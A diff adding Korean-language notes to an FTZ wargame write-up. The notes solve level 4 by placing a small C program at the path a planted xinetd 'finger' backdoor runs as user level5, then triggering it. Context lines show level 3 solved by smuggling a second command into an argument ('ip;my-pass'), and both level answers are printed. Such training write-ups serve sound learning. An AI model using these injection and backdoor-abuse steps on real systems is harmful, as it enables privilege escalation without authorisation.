@@ -107,3 +107,49 @@ find로 -user level4 로 검색해보니 autodig가 있었다... 뻘쭘
 해당 디렉토리로 이동후 ./autodig "ip;my-pass" 하니까 비밀번호가 나왔다.
 
 답 == suck my brain
+
+
+
+
+#================================================================================#
+#FTZ Level 4
+hint) 누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!
+
+
+#FTZ Level 4 풀이 과정)
+/etc/xinetd.d 에 백도어를 심어 놓았다고 하니, 가보자.
+ls -al 해보면 backdoor파일이 있다.
+service finger 
+{
+	disable	= no
+	flags		= REUSE
+	socket_type	= stream        
+	wait		= no
+	user		= level5
+	server		= /home/level4/tmp/backdoor
+	log_on_failure	+= USERID
+}
+라는 내용이 뜨는데, 일단 user = level5다. 
+server가 /home/level4/tmp/backdoor 라고 하니 가봤다.
+tmp 파일에는 아무것도 없다.
+막혔기에,
+backdoor와 finger의 개념에 대해서 공부했다.
+finger = 리눅스에서 사용자의 계정정보를 확인하는 명령어이다.
+
+finger를 실행하면 해당 서버인 /home/level4/tmp/backdoor를 level5 권한으로 실행한다고 하니,
+backdoor의 코딩을 my-pass를 보여주게 하면 되겠다.
+tmp vi backdoor.c 로 
+#include <stdio.h>
+#include <stdlib.h>
+
+void main(){
+    system("my-pass");
+}
+후 :wq 저장!
+
+gcc -o backdoor backdoor.c 를 하면 backdoor 파일이 만들어진다.
+자이제 확인 후, finger를 실행했다.
+finger level5@localhost
+하면 답이 반환된다.
+
+답 == what is your name?
